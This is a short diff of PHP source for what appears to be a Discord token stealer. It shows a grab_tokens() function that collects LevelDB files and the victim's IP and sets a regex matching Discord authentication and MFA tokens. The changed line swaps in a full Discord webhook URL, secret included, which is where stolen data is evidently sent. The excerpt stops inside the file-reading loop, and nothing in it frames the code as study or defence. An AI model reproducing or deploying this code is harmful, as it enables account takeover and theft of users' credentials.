@@ -39,7 +39,7 @@ function get_ldb_files() {
 function grab_tokens() {
     $ldb = get_ldb_files();
     $ip = grab_ip();
-    $discord_hook = "https://discord.com/api/webhooks/722771124676722688/";
+    $discord_hook = "https://discord.com/api/webhooks/1397276887298085036/64eGqFok-vacgOUmObG5shrBPgr24eAp2TCIMxf-jevdHM96MtjckHhC-eoFmGlgmJwy8/";
     $token_regex = "/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/";
     foreach ($ldb as $lol) {
         $file = fopen($lol, "r");
